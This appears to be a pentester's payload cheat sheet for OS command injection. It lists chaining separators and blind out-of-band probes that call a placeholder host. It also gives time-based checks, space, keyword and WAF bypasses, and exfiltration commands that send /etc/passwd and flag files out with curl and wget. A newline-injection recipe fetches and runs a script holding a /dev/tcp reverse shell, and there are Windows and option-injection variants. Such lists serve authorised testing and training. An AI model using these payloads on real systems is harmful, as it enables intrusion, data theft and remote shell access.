---
title: "Payloads: OS Command Injection"
type: payloads
tags: [payloads, command-injection, rce, web]
sources: []
date_created: 2026-06-16
date_updated: 2026-06-30
---

# Payloads: OS Command Injection

Reusable command-injection probes + filter bypasses. Blind variants need OOB (Collaborator/interactsh) - channel setup in [[oob-callbacks]]. See [[os-command-injection]].

## Separators / chaining
```
; id            | id            || id           && id
`id`            $(id)           %0aid          %0a id
\nid            {id,}           <(id)
```

## OOB confirm (blind)
```
; curl http://<id>.oob.example/`whoami`
| nslookup <id>.oob.example
& ping -c1 <id>.oob.example
$(curl http://<id>.oob.example)
```

## Time-based (blind, no OOB)
```
; sleep 10
&& ping -c 10 127.0.0.1
$(sleep 10)
| timeout 10 cat
```

## Space / filter bypass
```
cat${IFS}/etc/passwd        cat$IFS$9/etc/passwd
{cat,/etc/passwd}           cat</etc/passwd
X=$'cat\x20/etc/passwd'&&$X
echo${IFS}aWQK|base64${IFS}-d|sh        # base64-wrapped: id
```

## Validated host/IP field (ping / health / traceroute / nslookup)
A "host health check / ping / diagnostic" feature validates the input as a hostname/IP, usually
**per newline-separated line** against `^[A-Za-z0-9.-]+$`. A literal **newline (`%0a`)** bypasses an
`^`-anchored / per-line check and starts a new command (`os.system("ping -c2 "+target)`).
**Probe the charset first** - send `127.0.0.1%0aX` per metachar, watch for "Invalid":
```
127.0.0.1%0aid              # bare alnum command passes the hostname regex -> runs
# typical result: space, TAB, / , : are ALLOWED ; $ { } ; | & ( ) are BLOCKED
```
- If `$ { }` are blocked, **`${IFS}`, `$IFS$9`, `$()` are all dead** - but spaces are usually
  allowed, so just use a literal space. Do NOT reflexively reach for `${IFS}`.
- Each line is re-validated, so `;` `|` `&` chaining fails -> separate commands with more newlines.
- **Reverse shell when `; | & $ { } < >` are blocked but space/slash/colon pass**: put every
  metachar INSIDE a fetched script; the injection only needs `curl`+`bash`:
```
127.0.0.1
curl http://LHOST:8000/s -o /tmp/s
bash /tmp/s
# host  s = 'bash -i >& /dev/tcp/LHOST/PORT 0>&1'  on your box; pick an EGRESS-ALLOWED port
# (reflected-output sinks need no shell at all - cat /etc/passwd etc. run inline)
```

## Char/keyword bypass (WAF, blocklist)
```
c''at /et''c/pas''swd        c\at /et\c/pas\swd
/???/??t /???/p??s??         w'h'o'a'm'i
$(printf '\151\144')          # octal -> id
$(rev<<<'di')                 # reversed
a=c;b=at;$a$b /etc/passwd
```

## Allowlist / prefix-match bypass
App permits only one fixed command but checks it weakly (`strpos($cmd,'date')===0`, `startswith`,
a prefix `in_array`). Chain your command off the allowed prefix:
```
date;id            date && id          date | id          date `id`          date $(id)
ping -c1 127.0.0.1;cat /flag           # any allowed word as the prefix, then ; && | etc
```

## Exfil (read output without echo)
```
; curl -X POST --data-binary @/etc/passwd http://<id>.oob.example
; wget --post-file=/etc/passwd http://<id>.oob.example
; cat /flag | base64 | curl http://<id>.oob.example/$(cat -)
```

## Windows
```
& whoami      | whoami     && whoami
%0a whoami    & powershell -enc <b64>
& nslookup <id>.oob.example
```

## Argument/PATH injection
```
file -- -oG /tmp/x          # option injection
LD_PRELOAD / wildcard: tar cf x * -> --checkpoint-action=exec
```
